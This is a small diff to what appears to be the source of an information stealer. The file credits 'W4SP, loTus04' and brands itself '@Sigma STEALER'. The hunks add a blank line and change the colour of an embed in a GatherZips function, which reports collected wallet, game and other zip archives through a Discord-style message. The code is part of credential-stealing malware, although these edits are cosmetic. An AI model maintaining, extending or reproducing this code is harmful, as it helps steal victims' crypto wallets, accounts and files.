@@ -14,6 +14,7 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
+
 #  THIS IS 1.1.6 VERSION
 #    BY W4SP, loTus04
 # 
@@ -617,7 +618,7 @@ def GatherZips(paths1, paths2, paths3):
             {
             "title": "Sigma Zips",
             "description": f"{wal}\n{ga}\n{ot}",
-            "color": 15781403,
+            "color": 14221567,
             "footer": {
                 "text": "@Sigma STEALER",
                 "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
